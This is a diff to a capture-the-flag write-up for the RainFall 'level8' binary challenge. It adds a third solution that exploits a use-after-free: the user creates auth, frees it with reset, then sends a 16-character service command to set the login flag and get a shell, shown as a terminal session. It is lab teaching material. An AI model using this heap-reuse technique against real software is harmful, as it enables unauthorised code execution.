@@ -22,7 +22,7 @@ ok let's go then,
 first of all let's create auth, why ?
 So that the login doesn't segfault
 then let's do Service.
-There are two methods for that,
+There are three (2 unofficial) methods for that,
 1.
 you put an empty service command,
 in that case
@@ -68,5 +68,21 @@ $ cd ../level9
 $ cat .pass
 <hidden>
 ```
+The last one uses the fact that it doesn't put the pointer back to NULL.
+So let's create auth, free it, and create a service the service will take it's place, and if you put enought character
+it will in a boolean, because yes, it was a struct from the beginning.
+```
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+reset
+0x804a008, (nil) 
+service bbbbbbbbbbbbbbbb  
+0x804a008, 0x804a018 
+login
+$
+```
+and like the last time we put 16 characters
 
 GGs
